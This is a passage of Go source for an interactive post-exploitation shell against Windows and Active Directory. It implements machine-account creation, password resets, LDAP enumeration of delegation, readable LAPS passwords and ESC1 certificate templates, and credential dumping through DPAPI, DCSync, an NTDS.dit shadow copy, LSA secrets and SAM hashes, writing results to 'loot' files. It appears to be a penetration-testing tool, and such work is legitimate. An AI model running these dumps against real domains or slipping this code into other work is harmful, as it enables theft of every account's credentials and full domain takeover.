	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  created %s$\n", strings.TrimSuffix(name, "$"))
	if generated {
		ui.Faint.Printf("  password: %s\n", password)
	}
}

// cmdDelComputer deletes a machine account via one transient LDAP channel.
func (s *shell) cmdDelComputer(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: delcomputer <name>"))
		return
	}
	name := args[0]

	ui.Faint.Println("  opening LDAP channel")
	err := s.sess.DeleteComputer(name)
	s.trackOp(track.CategoryAD, "delcomputer", name+"$", "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  deleted %s$\n", strings.TrimSuffix(name, "$"))
}

// cmdChangePassword resets (or, with the old password given, changes) an AD
// user's password over one transient LDAPS/LDAP channel.
func (s *shell) cmdChangePassword(args []string) {
	if len(args) < 2 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: changepasswd <user> <newpassword> [oldpassword]"))
		return
	}
	user, newPass := args[0], args[1]
	oldPass := ""
	if len(args) > 2 {
		oldPass = args[2]
	}

	ui.Faint.Println("  opening LDAPS channel")
	err := s.sess.ChangePassword(user, newPass, oldPass)
	s.trackOp(track.CategoryAD, "changepasswd", user, "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  password changed for %s\n", user)
}

// randPassword generates a random 32-character password (mirrors
// tools/addcomputer's default).
func randPassword(n int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rnd := make([]byte, n)
	if _, err := rand.Read(rnd); err != nil {
		return "anvil-" + strconv.FormatInt(time.Now().UnixNano(), 36)
	}
	for i := range b {
		b[i] = charset[int(rnd[i])%len(charset)]
	}
	return string(b)
}

// cmdAdenum enumerates the domain over LDAP: users (default), computers,
// delegation, or laps. One transient LDAP channel per invocation,
// announced; the SMB session is untouched.
func (s *shell) cmdAdenum(args []string) {
	mode := "users"
	if len(args) > 0 {
		mode = strings.ToLower(args[0])
	}
	run, ok := map[string]func(){
		"users":      s.adenumUsers,
		"computers":  s.adenumComputers,
		"delegation": s.adenumDelegation,
		"laps":       s.adenumLAPS,
		"adcs":       s.adenumADCS,
	}[mode]
	if !ok {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: adenum [users|computers|delegation|laps|adcs]"))
		return
	}
	ui.Faint.Println("  opening LDAP channel")
	run()
}

// adenumUsers lists domain users with privilege and logon timestamps.
func (s *shell) adenumUsers() {
	users, err := adenum.Users(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(users) == 0 {
		ui.Faint.Println("  (none)")
		return
	}
	rows := make([][]tableCell, 0, len(users))
	for _, u := range users {
		rows = append(rows, rowCells(u.Name, u.Display, u.AdminCount, u.PwdLastSet, u.LastLogon))
	}
	printTable([]string{"NAME", "DISPLAY NAME", "ADMINCOUNT", "PWD LAST SET", "LAST LOGON"}, rows)
}

// adenumComputers lists domain computer accounts.
func (s *shell) adenumComputers() {
	computers, err := adenum.Computers(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(computers) == 0 {
		ui.Faint.Println("  (none)")
		return
	}
	rows := make([][]tableCell, 0, len(computers))
	for _, c := range computers {
		rows = append(rows, rowCells(c.Name, c.DNSHost, c.OS))
	}
	printTable([]string{"NAME", "DNS HOST", "OS"}, rows)
}

// adenumDelegation lists delegation relationships; unconstrained is
// highlighted — it hands the trusted host any user's TGT.
func (s *shell) adenumDelegation() {
	delegations, err := adenum.Delegation(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(delegations) == 0 {
		ui.Faint.Println("  (none)")
		return
	}
	rows := make([][]tableCell, 0, len(delegations))
	for _, d := range delegations {
		row := rowCells(d.Name, d.Type, d.Target)
		if strings.Contains(strings.ToLower(d.Type), "unconstrained") {
			row[1].c = ui.Warm
		}
		rows = append(rows, row)
	}
	printTable([]string{"NAME", "TYPE", "TARGET"}, rows)
}

// adenumLAPS lists hosts with a readable LAPS-managed local admin password.
func (s *shell) adenumLAPS() {
	hosts, err := adenum.LAPS(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(hosts) == 0 {
		ui.Faint.Println("  (none)")
		return
	}
	rows := make([][]tableCell, 0, len(hosts))
	for _, h := range hosts {
		row := rowCells(h.Host, h.Password, h.Expiry)
		row[1].c = ui.Accent
		rows = append(rows, row)
	}
	printTable([]string{"HOST", "PASSWORD", "EXPIRY"}, rows)
}

// adenumADCS lists AD CS certificate templates; templates whose name
// flags let the enrollee supply the subject are highlighted — that's the
// ESC1 condition.
func (s *shell) adenumADCS() {
	templates, err := adenum.CertificateTemplates(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(templates) == 0 {
		ui.Faint.Println("  (none)")
		return
	}
	rows := make([][]tableCell, 0, len(templates))
	for _, t := range templates {
		ekus := strings.Join(t.EKUs, ", ")
		row := rowCells(t.CN, ekus)
		if t.EnrolleeSuppliesSubject {
			row = append(row, tableCell{text: "ENROLLEE_SUPPLIES_SUBJECT", c: ui.Warm})
		} else {
			row = append(row, tableCell{text: "-", c: ui.Faint})
		}
		rows = append(rows, row)
	}
	printTable([]string{"TEMPLATE", "EKUS", "ESC1 FLAG"}, rows)
}

// tableCell is one rendered table cell: text plus an optional theme color.
// Color is applied after column padding, so escape codes don't break
// alignment.
type tableCell struct {
	text string
	c    *color.Color
}

// rowCells packs plain (uncolored) cells; callers colorize by index after.
func rowCells(texts ...string) []tableCell {
	cells := make([]tableCell, len(texts))
	for i, t := range texts {
		cells[i].text = t
	}
	return cells
}

// printTable renders an aligned table in the theme idiom: two-space indent,
// muted header row, columns padded to the widest cell with two-space
// gutters, last column unpadded.
func printTable(headers []string, rows [][]tableCell) {
	widths := make([]int, len(headers))
	for i, h := range headers {
		widths[i] = len(h)
	}
	for _, r := range rows {
		for i := range headers {
			if i < len(r) && len(r[i].text) > widths[i] {
				widths[i] = len(r[i].text)
			}
		}
	}

	render := func(cells []tableCell) {
		parts := make([]string, len(cells))
		for i, cell := range cells {
			s := cell.text
			if i < len(cells)-1 {
				s = fmt.Sprintf("%-*s", widths[i], s)
			}
			if cell.c != nil {
				s = cell.c.Sprint(s)
			}
			parts[i] = s
		}
		fmt.Println("  " + strings.Join(parts, "  "))
	}

	hdr := make([]tableCell, len(headers))
	for i, h := range headers {
		hdr[i] = tableCell{text: h, c: ui.Muted}
	}
	render(hdr)
	for _, r := range rows {
		render(r)
	}
}

// cmdDpapi decrypts Credential Manager secrets using the LSA masterkeys.
// Server-level op: needs no selected share (opens C$ transiently).
func (s *shell) cmdDpapi() {
	if !s.ensureWinreg() {
		return
	}
	entries, warnings, err := s.sess.DumpCredentials()
	s.trackOp(track.CategoryRegistry, "dpapi", "SECURITY+SYSTEM hives", "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(entries) == 0 {
		ui.Faint.Println("  no credentials decrypted")
		return
	}
	ui.Muted.Printf("  %-32s %-24s %s\n", "TARGET", "USERNAME", "SECRET")
	for _, e := range entries {
		fmt.Printf("  %-32s %-24s %s\n", e.Target, e.User, ui.Accent.Sprint(e.Secret))
	}
	ui.Faint.Printf("  %d credentials\n", len(entries))
}

// cmdDcsync replicates domain user hashes from NTDS via DRSUAPI. DRSUAPI
// has no SMB endpoint, so this opens ONE extra RPC-over-TCP channel for
// the duration of the command (the user is told). The SMB session is
// untouched.
func (s *shell) cmdDcsync(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: dcsync [--out <file>]"))
		return
	}
	ui.Faint.Println("  opening DRS channel (RPC/TCP via epmapper — DRSUAPI has no SMB endpoint)")

	_, dnsTree := s.sess.ServerInfo()
	ch, err := dcsync.Open(s.sess.Host(), dnsTree, s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	defer ch.Close()

	users, err := ch.DumpAll()
	if err != nil {
		s.opError(err)
		return
	}
	if len(users) == 0 {
		ui.Faint.Println("  no accounts returned")
		return
	}

	domain := dcsync.NetBIOSDomain(s.sess.Creds().Domain)
	lines := make([]string, 0, len(users))
	for _, u := range users {
		line := dcsync.Format(domain, u)
		lines = append(lines, line)
		fmt.Printf("%s\n", line)
	}
	ui.Faint.Printf("  %d accounts\n", len(users))
	if out != "" {
		s.writeLoot(out, "dcsync "+s.sess.Host(), lines)
	}
}

// cmdNtdsdump dumps domain account NT/LM hashes offline: a VSS shadow copy
// of the DC's system drive is created via exec, ntds.dit + SYSTEM are
// copied out and downloaded over the SMB session, and everything is parsed
// and decrypted locally. Server-level op: needs no selected share.
func (s *shell) cmdNtdsdump(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: ntdsdump [--out <file>]"))
		return
	}
	ui.Faint.Println("  creating shadow copy on target (exec as SYSTEM)")
	users, warnings, err := s.sess.NtdsDump()
	s.trackOp(track.CategoryRegistry, "ntdsdump", "VSS shadow + ntds.dit", "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(users) == 0 {
		ui.Faint.Println("  no accounts found")
		return
	}

	// Domain for the secretsdump prefix: the session's domain, else the
	// NTLM challenge's DNS tree name (same NetBIOS derivation as dcsync).
	domain := dcsync.NetBIOSDomain(s.sess.Creds().Domain)
	if domain == "" {
		_, dnsTree := s.sess.ServerInfo()
		domain = dcsync.NetBIOSDomain(dnsTree)
	}
	for _, u := range users {
		fmt.Printf("%s\n", ntds.Format(domain, u))
	}
	ui.Faint.Printf("  %d accounts\n", len(users))
	if out != "" {
		lines := make([]string, 0, len(users))
		for _, u := range users {
			lines = append(lines, ntds.Format(domain, u))
		}
		s.writeLoot(out, "ntdsdump "+s.sess.Host(), lines)
	}
}

// cmdLsadump prints LSA secrets and cached domain logons (MSCashV2).
// Server-level op: needs no selected share.
func (s *shell) cmdLsadump(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: lsadump [--out <file>]"))
		return
	}
	if !s.ensureWinreg() {
		return
	}
	res, warnings, err := s.sess.LsaDump()
	s.trackOp(track.CategoryRegistry, "lsadump", "SECURITY+SYSTEM hives", "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(res.CachedLogons) == 0 && len(res.Lines()) == 0 {
		ui.Faint.Println("  (no LSA secrets)")
		return
	}
	var loot []string
	if len(res.CachedLogons) > 0 {
		ui.Muted.Println("  CACHED LOGONS")
		for _, c := range res.CachedLogons {
			line := lsa.FormatCached(c)
			loot = append(loot, line)
			fmt.Printf("  %s\n", line)
		}
	}
	if lines := res.Lines(); len(lines) > 0 {
		ui.Muted.Println("  LSA SECRETS")
		for _, l := range lines {
			loot = append(loot, l)
			fmt.Printf("  %s\n", l)
		}
	}
	if out != "" {
		s.writeLoot(out, "lsadump "+s.sess.Host(), loot)
	}
}

// cmdSamdump prints local account NT/LM hashes in secretsdump format.
// Server-level op: needs no selected share.
func (s *shell) cmdSamdump(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: samdump [--out <file>]"))
		return
	}
	if !s.ensureWinreg() {
		return
	}
	users, warnings, err := s.sess.SamDump()
	s.trackOp(track.CategoryRegistry, "samdump", "SAM+SYSTEM hives", "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(users) == 0 {
		ui.Faint.Println("  no local accounts found")
		return
	}
	lines := make([]string, 0, len(users))
	for _, u := range users {
		line := sam.Format(u)
		lines = append(lines, line)
		fmt.Printf("%s\n", line)
	}
	if out != "" {
		s.writeLoot(out, "samdump "+s.sess.Host(), lines)
	}
}

// cmdReg dispatches registry subcommands. Server-level op: needs no
// selected share. All subcommands need the RemoteRegistry service —
// ensureWinreg starts it lazily (restored at exit).
func (s *shell) cmdReg(args []string) {
	if len(args) < 1 {
		s.regUsage()
		return
	}
	if !s.ensureWinreg() {
		return
	}
	switch strings.ToLower(args[0]) {
	case "query":
		s.cmdRegQuery(args[1:])
	case "save":
		s.cmdRegSave(args[1:])
	case "set":
		s.cmdRegSet(args[1:])
	case "delvalue":
		s.cmdRegDelValue(args[1:])
	case "createkey":
		s.cmdRegCreateKey(args[1:])
	case "delkey":
		s.cmdRegDelKey(args[1:])
	case "search":
		s.cmdRegSearch(args[1:])
	default:
		s.regUsage()
	}
}

func (s *shell) regUsage() {
	fmt.Printf("  %s\n", ui.Muted.Sprint(`usage: reg query <HIVE\path> [/v name] | reg save <HIVE\path> <remote-file> | reg set <key> <value> <type> <data> | reg delvalue <key> <value> | reg createkey <key> | reg delkey <key> | reg search <root> <pattern>`))
}

// cmdRegSave exports a key to a file on the target's filesystem.
func (s *shell) cmdRegSave(args []string) {
	if len(args) < 2 {
		s.regUsage()
		return
	}
	keyPath, remoteFile := args[0], args[1]
	if !isAbsWinPath(remoteFile) {
		fmt.Printf("  %s\n", ui.Muted.Sprint(`remote file must be an absolute Windows path (e.g. C:\Windows\Temp\sam.save) — the file is written on the target`))
		return
	}
	if err := s.sess.RegSave(keyPath, remoteFile); err != nil {
		s.trackOp(track.CategoryRegistry, "save", keyPath, remoteFile, err)
		s.opError(err)
		return
	}
	s.trackOp(track.CategoryRegistry, "save", keyPath, remoteFile, nil)
	ui.Faint.Printf("  saved %s -> %s\n", keyPath, remoteFile)
}

// isAbsWinPath reports whether p is a drive-letter absolute Windows path.
func isAbsWinPath(p string) bool {
	if len(p) < 3 || p[1] != ':' || (p[2] != '\\' && p[2] != '/') {
		return false
	}
	c := p[0]
	return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')
}

// parseRegQueryArgs splits `reg query` arguments into the key path and an
// optional /v value name. Anything beyond that is a surplus token — most
// often an unquoted key path containing a space, which would otherwise
// silently query the wrong key (observed on a live DC: an unquoted
// "HKLM\...\Windows NT\CurrentVersion" queried ...\Windows instead).
func parseRegQueryArgs(args []string) (keyPath, valueName string, hasV bool, surplus string) {
	if len(args) == 0 {
		return "", "", false, ""
	}
	keyPath = args[0]
	for i := 1; i < len(args); i++ {
		if strings.EqualFold(args[i], "/v") && i+1 < len(args) {
			valueName, hasV = args[i+1], true
			i++
			continue
		}
		return keyPath, "", false, args[i]
	}
	return keyPath, valueName, hasV, ""
}

// cmdRegQuery reads the remote registry (winreg).
func (s *shell) cmdRegQuery(args []string) {
	keyPath, valueName, hasV, surplus := parseRegQueryArgs(args)
	if keyPath == "" {
		s.regUsage()
		return
	}
	if surplus != "" {
		fmt.Printf("  %s\n", ui.Muted.Sprintf("unexpected argument %q — quote key paths containing spaces", surplus))
		return
	}

	if hasV {
		v, err := s.sess.RegQueryValue(keyPath, valueName)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Muted.Printf("  %s\n", keyPath)
		disp := v.Name
		if disp == "" {
			disp = "(Default)"
		}
		fmt.Printf("  %-24s %s\n", disp, formatRegValue(*v))
		return
	}

	subkeys, values, err := s.sess.RegQuery(keyPath)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Muted.Printf("  %s\n", keyPath)
	if len(subkeys) == 0 && len(values) == 0 {
		ui.Faint.Println("  (no subkeys or values)")
		return
	}
	for _, v := range values {
		disp := v.Name
		if disp == "" {
			disp = "(Default)"
		}
		fmt.Printf("  %-24s %s\n", disp, formatRegValue(v))
	}
	for _, name := range subkeys {
		fmt.Printf("  %s\n", ui.Faint.Sprint(name+`\`))
	}
}

// formatRegValue renders a registry value's type and data.
func formatRegValue(v smbclient.RegValue) string {
	typeName := regTypeName(v.Type)
	switch v.Type {
	case winreg.REG_SZ, winreg.REG_EXPAND_SZ:
		return fmt.Sprintf("%-20s %s", typeName, utf16String(v.Data))
	case winreg.REG_DWORD:
		var n uint32
		if len(v.Data) >= 4 {
			n = binary.LittleEndian.Uint32(v.Data[:4])
		}
		return fmt.Sprintf("%-20s %d (0x%x)", typeName, n, n)
	case winreg.REG_QWORD:
		var n uint64
		if len(v.Data) >= 8 {
			n = binary.LittleEndian.Uint64(v.Data[:8])
		}
		return fmt.Sprintf("%-20s %d (0x%x)", typeName, n, n)
	case winreg.REG_MULTI_SZ:
		return fmt.Sprintf("%-20s %s", typeName, strings.Join(multiString(v.Data), "; "))
	default: // REG_BINARY and everything else
		return fmt.Sprintf("%-20s %s", typeName, hexCap(v.Data))
	}
}

func regTypeName(t uint32) string {
	switch t {
	case winreg.REG_SZ:
		return "REG_SZ"
	case winreg.REG_EXPAND_SZ:
		return "REG_EXPAND_SZ"
	case winreg.REG_BINARY:
		return "REG_BINARY"
	case winreg.REG_DWORD:
		return "REG_DWORD"
	case winreg.REG_DWORD_BIG_ENDIAN:
		return "REG_DWORD_BIG_ENDIAN"
	case winreg.REG_MULTI_SZ:
		return "REG_MULTI_SZ"
	case winreg.REG_QWORD:
		return "REG_QWORD"
	case winreg.REG_NONE:
		return "REG_NONE"
	default:
		return fmt.Sprintf("REG_TYPE(%d)", t)
	}
}

// utf16String decodes UTF-16LE and trims trailing NULs.
func utf16String(b []byte) string {
	u16s := make([]uint16, len(b)/2)
	for i := range u16s {
		u16s[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	for len(u16s) > 0 && u16s[len(u16s)-1] == 0 {
		u16s = u16s[:len(u16s)-1]
	}
	return string(utf16.Decode(u16s))
}

// multiString decodes a REG_MULTI_SZ blob into its strings.
func multiString(b []byte) []string {
	u16s := make([]uint16, len(b)/2)
	for i := range u16s {
		u16s[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	var out []string
	var cur []uint16
	for _, c := range u16s {
		if c == 0 {
			if len(cur) > 0 {
				out = append(out, string(utf16.Decode(cur)))
				cur = nil
			}
		} else {
			cur = append(cur, c)
		}
	}
	if len(cur) > 0 {
		out = append(out, string(utf16.Decode(cur)))
	}
	return out
}

// hexCap hex-encodes data, capping at 64 bytes with a truncation note.
func hexCap(b []byte) string {
	if len(b) > 64 {
		return fmt.Sprintf("%s ... (%d bytes total)", hex.EncodeToString(b[:64]), len(b))
	}
	return hex.EncodeToString(b)
}

// cmdUsers lists domain users (SAMR). Server-level op: needs no selected
// share.
func (s *shell) cmdUsers() {
	users, err := s.sess.EnumUsers()
	if err != nil {
		s.opError(err)
		return
	}
	ui.Muted.Printf("  %-6s %-22s %s\n", "RID", "NAME", "FULL NAME/COMMENT")
	for _, u := range users {
		detail := u.FullName
		if u.Comment != "" {
			if detail != "" {
				detail += " — "
			}
			detail += u.Comment
		}
		fmt.Printf("  %-6d %-22s %s\n", u.RID, u.Name, detail)
	}
}

// opError prints a one-line themed error. Fatal transport errors print
// "connection lost" and mark the shell dead so dispatch exits with code 1.
func (s *shell) opError(err error) {
	if smbclient.IsTransportError(err) {
		fmt.Printf("%s\n", ui.Red.Sprint("connection lost"))
		s.dead = true
		return
	}
	ui.PrintErr(smbclient.Describe(err))
}

// splitArgs splits on spaces with single/double quote grouping. Backslash
// is a literal path character (SMB paths), not an escape.
func splitArgs(line string) []string {
	var args []string
	var cur strings.Builder
	var quote rune

	flush := func() {
		if cur.Len() > 0 {
			args = append(args, cur.String())
			cur.Reset()
		}
	}

	for _, r := range line {
		switch {
		case r == '"' || r == '\'':
			if quote == 0 {
				quote = r
			} else if r == quote {
				quote = 0
			} else {
				cur.WriteRune(r)
			}
		case r == ' ' && quote == 0:
			flush()
		default:
			cur.WriteRune(r)
		}
	}
	flush()
	return args
}
